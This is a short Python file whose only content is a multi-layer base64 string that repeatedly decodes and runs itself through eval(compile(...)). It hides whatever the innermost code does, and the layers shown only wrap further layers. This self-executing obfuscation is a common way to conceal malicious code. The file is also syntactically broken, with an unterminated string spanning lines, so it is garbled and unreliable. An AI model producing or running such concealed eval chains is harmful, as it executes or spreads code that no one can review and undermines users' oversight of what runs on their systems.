import base64
oOO0oooOO = "import base64
oOO0oooOO = "aW1wb3J0IGJhc2U2NApvT08wb29vT08gPSAiYVcxd2IzSjBJR0poYzJVMk5BcHZUMDh3YjI5dlQwOGdQU0FpWVZjeGQySXpTakJKUjBwb1l6SlZNazVCY0haVU1EaDNZakk1ZGxRd09HZFFVMEZwVG5wa01Vd3diRFZSYWtwb1ZucEJNbGRzYUc5a01XeFlUbGQwYTFJd1duQlVNalZQWkVac1dWTnFRbWhXZWxaeVYyeGpNVTFGT1hWVmJXaGFZbXMwZDFscVRrSlBWVFZGWTBod2FVMXNiM2RhUldSSFlWZE5lbFZ1V21wU1JFRjNWREkxVDJJeVJsaFhha0pyVFcxNGNscEZaRzVQVlRWRllqQjBTbVZWUmpCVE1tdDNXakZyZVU5WGRHaFdlbFoxVkRKc1EwMVhVa2hYV0ZKUVVUQkdNRk15YTNkVE1rWllUVmhrYVUwd2IzZFRWV1EwWkd4dmVWcElRbWxpVjA1TVdWWmplR1F5U1hwVGFrSktVMFpLZDFsc1pGWlRNa1pZVFZoa2FVMHdiM2RUVldNMVpXdE9kR0pJVW1wU2VtdzFXa1ZPUTAweVJsaE9TSEJPWWxWYU0xbFdSbmRqUjBwWlVXNWFhbUpzUm01WlZXUkhaVzFHU0dWSVFscGFNMEowV1RJd05XUkZiRWhWYldoclVqRlpkMWxXWTNoaVJXeElZa2hTYWxKNmJEVmFSVTVEWVRGc1dWVnRlR3RTTW5nd1YyeEdkMkpYVG5SUFdGSktVakZLYjFwRlpGZE5WMUpJWWtoT1RXSnJjSE5aYTJSSFRVZEdXVmR0ZUdGU01WcDZXa1ZrUmxveVJsaE5XR1JwVFRCdmQxTlZhRXRpUjBwSVVtcENhRmRHY0hOWGEyUlhZekpTU0ZKVmRHRmlhM0F5V1d4T1EyVnRVa2xUYmtKcFlsZE9ibGxXWTNoa01rbDZVMnBDU2xJd1dqWlhWRXB6WTBabmVXVkhlR3RUUmtweldUSTFUbU13YkVoVmJrSmhUVzEzZDFremJETmFNa2w1VkdwQ1lWSXllSFZaVm1oVFpXdE9kRmR1YkdsTmFrSnVXVEl4UjJSV2NFaFBXRkpLVWpKNE1Ga3dZelZsVjFKRVVXNXdZVll4V25KVVJVNURaV3hzV0UxWVpHbFNNVlp1VkVWT1EyVldiRmhPVjNScVlsVmFNVmRxU2xaVE1FNXpUMWhPYVUxdFVuVlhiR2hLV2pGQ1ZGRnVUbWxOYlZKMVdWWmpNV0pyZUhSYVIzaHJVbGhvTWxkcVNtdGlSMDV3WVVkYVdVMXFWbTlaYkdSWFdteG9OV0V3ZEdsV01GcDFXVlprVDFwdFNsaFZWRVpLVWtSQ2JsTnViRkpPUlhCRVdUQjBSR0pXU25OWGJXeERZbXh3V1ZWdFdtaFNNVXB5VjBST1QySkhUblJpUjNoTVVUSnpNbEV5YkVKYU1HeEVVV3BPYUZaNlVtNVZSazVEWkcxT05VNVhlR2xpYkhCM1dUSXdOV1JXWkRWYVJtaFVWbFJXUmxVeFdrcGliR2hTWWpKa1NsRXdSbTVaTWpGWFRVZFNXVk51VmtwVFIxSjNXVzF3VG1WV2JGbFJia0pOWVRKU2MxcEZXbUZrYlVwSlZtNVNZVlpYZURGWGJUQTFaVmRLV0ZKcVFtaFdlbXd4VXpCb2EyTkhTbk5qTTJSWlZUTk9jRlF5ZURSWk1HeHdZa2RLVGxacVFreFJNakZUWWtad2NGRnROV0ZXZWxadFdYcEtSMk15VWtSYU1tUnBVakZhTVZkcVRsTmlNVUpWV2pOT1NsTkZOREZaYkdSTFpHMUtTVlJVYkZwWFJUVnhXVlprYzFwdFNraFdha0pyVWpGYU5Wa3piRUpqYTJ4SVZXNUNZVTF0ZDNkWk0yeENZMFU1Ym1JeVpFcFJNRVp1V1hwS1YySkdjRVJhTTBKRVlWVkdibE5WVGtObFZuQlpWV3BHYW1KVVVtNVRibXhxWkZkR2RFOVlRbWxoVjJSdVdYcEtSMlJIVGtobFIzaE1VVEJLTmxwV1kzaGhWMGw1WlVod1RWRXdTbnBYYkdNeFltMVNTRm95WkV4Vk1FWjNVVEprY2xNeGNFaFdiVEZLVWpKU2MxbHRkelZqYkhCWllUSTVhV0pzV2pCVVJVNURZekZ3V0U1WE5XdFNNbU0xVkRGT2NrNXJUbkJSVjJSS1VUQktObGRzWTNoalIwcElaREprVVZVd1JuVlRibVIyVTJ4d2RFOVliRXBTTTJSdVdWWmpNRm95VG5SU2JsWmhUV3hXZGxSVlRqUmpNWEJZVGxjMWExSXlaSHBVVms1eVRtdE9ibUV3Y0dwTmJGb3dXVlprTkdNd2JFUmplbXhLVTBVMGQxa3liRzlsVm14WVRsZDBhbUpWV2pGWGFrcFdZakF4UkdSNlRreFZNblJNVVRGb1MySkhVa2xXYm14cFlWVktObGRzWTNoalIwcElaRE5XYW1KV1dqTlphMlJIWVd4d1ZHRkljR0ZXZWtaM1dXdGtORmx0UmxoT1ZFSk1VMFUxYzFsc1pITmpNa3BIWXpOU1RsWnFRbmRYUms0MFpGZFNXRTFJUWtSYU0wSnlWMnhrV2xveGNGaE9WM0JxWW0xNE0xcEZXVFZrUm5CRlZsYzVTbE5GY0c5YVJFVTFaREpTTldReVpHcE5hMXA2V2tWT00xb3lTbGhTYlRWb1ZqQXdOVmxzWkVkaWJVWllWRzFhYVZZeFJYaFRWVTV5VG10T2NGRlhaRXBSTUVvMVYxWm9hMXB0VGtsWk1tUlJWVEJLTlZkV2FHdGFiVTVKV1ROV1lWWjZWbkZaYWtwVFlrVjBSRnBFUm10U01Xd3dWREJPYW1ORlRuQlJWMlJLVVRCS05sZFdaRFJOUld4RlRVZGthazFyV25wYVJVMHhZa2RLZEZSdVdtRlNNVloyVTJwT1YwMUdjSEJOUkZKTFpWZDBURk5WVGtKYU1HeElZVWRvYWsxdFpHNVZSazVEWWpGc1dWUnRPV2xTTW5od1ZFY3dlR0V3TlZSYU0wSkVZVlZHYmxOVlRrTmlNV3haVkcwNVRXSnNXak5YYTJSSFRVWndWRm95WkdwaVZWbDZWMFJPUTAwd2JFUmpNbVJwVmpCYWRWbFdaRTVhTUhRMVVXNXdXbFl6WjNkVFZVNXlVekJzUkZGWFpFcFRSVFIzVTFWUmQxb3lSa2hTYm5Cb1VqTm9kMWRYYXpGa1JuQkZWbGM1VEZWWE9XNVRWVTVDV2pKTmVsVllWbXRYUlVweVYxWm9VMkpGZEVSUmJteGFWMGRTYlZrd2FHcGFNSFExVVc1d1dsWXpaM2RUVlU1NldqSk9kRkpxVGxsTk1FbDZVekZHZGxvd2JFUlJWMlJxVFRGS05WZHNhRk5oYlVaRVVWUnNTbE5GTkhkVVJ6RlRZMFp2ZVZadWNHdFJNbVIzVVRKa2Rsb3diRVJSVjJSaFlsUnNOVk5WWkhKYU1rWllUa2RrYW1KVldqRlhha3BXWWpCc1JWRllUa3BTTTJoeldXMXNibG95VG5SU2FrNVpUVEJKZWxOVlRuSmFNSFJWWWpCMFNsRXdSbTVUVlU1Q1dqQnNSRkZ0T1ZwWFJUVjJWRWMxVjJReGNFaFNha0poVlRKa2JsbDZUbE5sVm5CWlZXMXdhRkp1VW5kVFZVNVdXakF4VlZkdFVrcFJNblJNVTFWT1Fsb3diRWhoTW1SUlZUQktlbGRzWXpCaU1HeEpVMjFvYTAxVWJETmFTR3hDWTBWT2JtSXlaRXBSTUVadVdrUktiMk5IU2toV1YyUm9Wa2M1VEZOVlRrSmFNR3hFVVZka1NsRXdTbmRYYld4RFkwVnNSRmRYWkU1V1J6bE1VMVZPUWxvd2JFUlJWMlJLVVRCR2JsTlZUa0phTWtaSVVtNXdhRkY2VlhoWk1HUlRZVWRTU0ZaWE9VdE5XR2N3VkZWU1FtSnJkRkppTW1SS1VUQkdibE5WVGtKYU1HeElWbTVPYWsxc1ZUSlJNbXhDV2pCc1JGRlhaRXBSTUVadVUxVk9RbG93YkVoaFIyaHFUVzFrTVZwR2FFTmhNV3haVlcxNFRGRXdTalZYVm1ocldtMU9TVnBIU2s1U2FrSnVVekZHZGxvd2JFUlJWMlJLVVRCR2JsTlZaSEphTVVKeFRrUnNTbEpGVmt4Uk1teENXakJzUkZGdWNGcFdNMmQzVjJ4a1UyUkdjRVZXVjJSUlZUQktkbGRXYUU5aU1IaDBWVzVDWVUxc1dqWmFSVTV1WTBWT2JtSXlaRXBSTUVadVYyMHdOV1ZWYkVoaE1tUm9WbnBTYmxreU1VZGtWbTk1VmxjNVNsSkZWak5VVlZKQ1dqQjBWV0l3ZEVwUk1FWnVVMVZPUWxvd2JFUlJiVGxhVjBVMWRsTlZVWGRhTWtaSVVtNXdhRkl6YUhkWFYyc3haRVp3UlZaWE9VeFZWemx1VTFWT1Fsb3diRVJSVjJSS1VqSjRkRk5WWkhKYU1IQndVVmhvVUZveU9XNVRWVTVDV2pCc1JGRlhaRXBSTUVadVUxVk9RMkl4YkZsVWJUbE5ZbXhhTTFkclpFZE5SbkJVV2pKa2FtSlZXWHBYUkU1RFRUQnNSR0V3ZEVwUk1FWnVVMVZPUWxvd2JFUlJiWGhwVTBVMWMxUXlaSFphTUd4RVVWZGtTbEV3Um01VFZVNUNXakJzUkZGdE9WcFhSVFYyVkVjMVYyUXhjRWhTYWtKaFZUSmtibGw2U2tkak1sSklWbTEwYVZZeFJYaFRWVTV5VXpCc1JGRlhaRXBSTUVadVUxVk9RMk5HY0hCUmJrSktVVEZXYmxSWWNIWlRNR3hFVVZka1NsRXdSbTVUVlU1Q1dqQnNSRkZYWkdoU01GbzJXVlZOTVUxWFRraFZiV2hyVWpGV2RsTlZhRTloUjBwSlZWZGtURlZYT1c1VFZVNUNXakJzUkZGWFpFcFNNbmgwVTFWa2Nsb3djRlJSVkU1UVdqSTVibE5WVGtKYU1HeEVVVmRrU2xFd1JtNVRWVTVEWWpGc1dWUnRPVTFpYkZvelYydGtSMDFHY0ZSYU1tUnFZbFZaZWxkRVRrTk5NR3hFWVRCMFNsRXdSbTVUVlU1Q1dqQnNSRkZ1UW1GaFZVcDNVMVZPV2xvd01WVmlNSFJLVVRCR2JsTlZUa0phTUd4RVVWZGtTbEV3Um01WlZXUkhaVzFHUkU1VVJtcFNNVXB2V2tWa1ZtSXdiRWxVYldocFUwWktjMWRyWTNoaE1EVlVVVmhDUkdGVlJtNVRWVTVDV2pCc1JGRlhaR0ZXTTJnMlYyeFNkbE13YkVSUlYyUktVVEJHYmxOVlRrSmFNR3hFVVZka2FGSXdXalpaVlUweFRWZE9TRlZ0YUd0U01WWjJVMVZvUzJGSFVYaFBXR1JyWlZWR2QxRXlaSFphTUd4RVVWZGtTbEV3Um01VFZXaFBZVWRLU1ZWdGVHRlNla1p5Vkd4T1FrOVZiRWhoUjJocVRXMWtNVmRyWkhOaWJIQlpWR3BDVEZFeWRFeFJNbXhDV2pCc1JGRnVRbXRTZW14dlZHMXdVbG94UWxSUlZ6Vk5ZVlJvTTFSV1VrcGxhelZGVmxSS1QyVnRZekZWVmxaTFVrWktSbFpyWkZOTlIyaExWVEowTUZSV1VsWk9Wa0pXVW10YVZGWlVSbE5XYkZweldrWnNXRlp1UW05WFZ6RlBZVEZ3V0ZkdE5XaFNNbmg0V1ZSS05HUkhTblJQV0dScVYwVndObHBGYUZkTmJWRjZZVVJXYkdGWFRreFJNbXhDV2pCc1JGRnViR0ZXTUZvMVdUSXhSMlJXYjNsV2JYUktVa1JDYmxOdWJHcFRNR3hFVVZka1NsSXhjREpaTW14RFlVVjRSRkZ0YkUxUk1FcHhVMVZrYzJSVmJFUmFNamxPVVROa2JsUnRiRE5hTURGVlUxaENUVkV3Um5aVVZrNHpXakExTldReVpFNVdSVEYzVkVWT1FtSXdNWEJrTW1SUVVUTmtibFJXVWxKalJYaEVVVmM1VG1WWVpHNVVNVTR6V2pBeFZWWllRazFSTUVaMlZHdE9NMW93TVZWUldFNUtVa1pXZDFNeFVuWlRNR3hFVVZka1NsRXdSbTVUVlU1RFRXdHNSVTFIWkdsTk1IQnlVekJPUTJWc2JGaGxSRUpoVmpGS01GZHJVbGRaYkd4WFRVZGtURlV3UlRSVlJVNUNaVVUxY0ZGcWFFcFNlbXcxVjJ0T2Jsb3lUWGxTYms1clVqRmFjbGxzWkZKTlZtTjVVMjFTU2xFeWRHNVZSVkl6V2pBNVJGRnFhRXBTZW13MVYydE9ibG95VFhsU2JrNXJVakZhY2xsc1pGSk5WbU41VkcxU1NsRXlkRXhUVlU1Q1dqQnNSRkZYWkVwUk1FcDBXV3BPU2xveVJsUlJia0pwWVZWS05WZFdZekZpYkhCVVducENURlpIT1V4VFZVNUNXakJzUkZGWFpFcFJNRVp1VTFWT1Fsb3lUblJXYldocVltdHdiMWx0TVd0aVJuQkVVVmhLVVZVd1NuZGFSV00xWVVVMWNWVnRTbXRoVlVaMFUxVlNRMDVGTUhsWGJWSkVZVlZHYmxOVlRrSmFNR3hFVVZka1NsRXdSbTVUVldoYVdqRkNjVTVFYkVwU1JteE1VVEpzUWxvd2JFUlJha3BLVWtSQ2JsbHFUa3RoTUhSRVVXNXdXbFl6WjNkWGJHUlRaRVp3UlZadFNrNVdSVnByVTFWT2NsTXdUbkJSVjJSS1VUQktkRmxxVGtwYU1rWlVVVzVDYVdGVlNqVlhWbU14WW14d1ZGb3laRTVoVlVaM1ZESmtkbG93YkVSUlYyUktVVEJHYmxOVmFFdGlSbXhaVTI1c1dsWjZWblZYYkdSU1dqQjBOazFIWkdoWFJrb3lWMVpTV2sxR1kzcFhWMlJMWVZWR00xcFZVazlpVm1oU1lqSmtTbEV3Um01VFZVNUNXakJzU1ZkWFpGRmhhbEUxVTFWU1dsTXdUbkJSVjJSS1VUQktOVmRzYUZOTlYwNTBUa2RrYVZZd1duVlpWbVJPV2pCME5WRnVjRnBXTTJkM1UxVk9lbG93Y0RWVlZ6VktVVE5PYmxreU1WZGhSMDUxVTIxb2FXSlhVbk5YYTA1Q1dqQnNSRkZVTUdsRGJWWXlXVmQzYjFreU9YUmpSMnh6V2xOb2FWbFlUbXhPYWxGMVdXcFpNRnBIVm1waU1sSnNTMGM1VUZSNlFuWmlNamxRVkhscmMwbERTVGhqTTFKNVlWYzFibEJwU1hOSlEyUnNaVWRXYWtwNWEzQWlDbVYyWVd3b1kyOXRjR2xzWlNoaVlYTmxOalF1WWpZMFpHVmpiMlJsS0c5UFR6QnZiMjlQVHlrc0lDSThjM1J5YVc1blBpSXNJQ2RsZUdWakp5a3AiCmV2YWwoY29tcGlsZShiYXNlNjQuYjY0ZGVjb2RlKG9PTzBvb29PTyksICI8c3RyaW5nPiIsICdleGVjJykp"
eval(compile(base64.b64decode(oOO0oooOO), "<string>", 'exec'))"
eval(compile(base64.b64decode(oOO0oooOO), "<string>", 'exec'))